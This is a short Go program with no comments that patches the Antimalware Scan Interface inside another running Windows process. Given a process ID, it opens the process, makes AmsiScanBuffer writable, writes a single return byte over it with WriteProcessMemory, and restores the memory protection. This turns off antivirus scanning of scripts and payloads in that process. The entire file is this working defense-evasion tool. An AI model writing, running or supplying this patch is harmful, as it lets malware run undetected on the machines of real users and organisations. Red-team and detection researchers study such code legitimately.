package main

import (
	"fmt"
	"golang.org/x/sys/windows"
	"syscall"
	"os"
	"strconv"
	"unsafe"
)

var(
	fntdll = syscall.NewLazyDLL("amsi.dll")
	AmsiScanBuffer  = fntdll.NewProc("AmsiScanBuffer")
	k32 = syscall.NewLazyDLL("kernel32.dll")
	WriteProcessMemory  = k32.NewProc("WriteProcessMemory")
)


func main(){
	pid, err := strconv.ParseInt(os.Args[1], 10, 0)
	if err != nil {
             fmt.Println("First input parameter must be integer")
             os.Exit(1)
  }
	hProcess, errOpenProcess := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, uint32(pid))
	if errOpenProcess != nil {
		panic(fmt.Sprintf("[!]Error calling OpenProcess:\r\n%s", errOpenProcess.Error()))
	}

	var oldProtect uint32
	var old uint32
	var patch = []byte{0xc3}

	windows.SleepEx(500,false)

	amsi := []uintptr{
		AmsiScanBuffer.Addr(),
	}

	var e error
	var r1 uintptr

	for _,baseAddr := range amsi{
		e = windows.VirtualProtectEx(windows.Handle(hProcess), baseAddr, 1, syscall.PAGE_READWRITE, &oldProtect)
		if e != nil {
			fmt.Println("virtualprotect error")
			fmt.Println(e)
			return
		}
		r1,_,e = WriteProcessMemory.Call(uintptr(hProcess),baseAddr, uintptr(unsafe.Pointer(&patch[0])), uintptr(len(patch)),0)
		if r1 == 0{
			fmt.Println("WriteProcessMemory error")
			fmt.Println(e)
			return
		}
		e = windows.VirtualProtectEx(windows.Handle(hProcess), baseAddr, 1, oldProtect, &old)
		if e != nil {
			fmt.Println("virtualprotect error")
			fmt.Println(e)
			return
		}
	}

	windows.CloseHandle(windows.Handle(hProcess))
}